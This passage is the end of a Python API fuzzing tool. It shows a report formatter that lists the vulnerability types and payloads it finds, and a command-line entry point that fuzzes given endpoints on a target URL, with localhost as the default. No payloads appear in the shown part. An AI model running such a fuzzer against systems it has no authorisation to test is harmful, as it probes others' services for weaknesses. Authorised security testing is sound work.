                report.append(f"  Vulnerability: {v.vulnerability_type}")
                report.append(f"  Payload: {v.payload[:100]}...")

        return "\n".join(report)


# =============================================================================
# CLI
# =============================================================================

async def main():
    parser = argparse.ArgumentParser(description="API Fuzzing Framework")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://localhost:8000)")
    parser.add_argument("--endpoints", nargs="+", default=["/api/v1/auth/login", "/api/v1/users"],
                        help="Endpoints to fuzz")
    parser.add_argument("--iterations", type=int, default=100, help="Iterations per endpoint")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--output", help="Output report file")

    args = parser.parse_args()

    fuzzer = APIFuzzer(args.target, args.threads)

    await fuzzer.fuzz_all(args.endpoints, args.iterations)

    report = fuzzer.generate_report()

    print(report)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        print(f"\nReport saved to: {args.output}")


if __name__ == "__main__":
    asyncio.run(main())
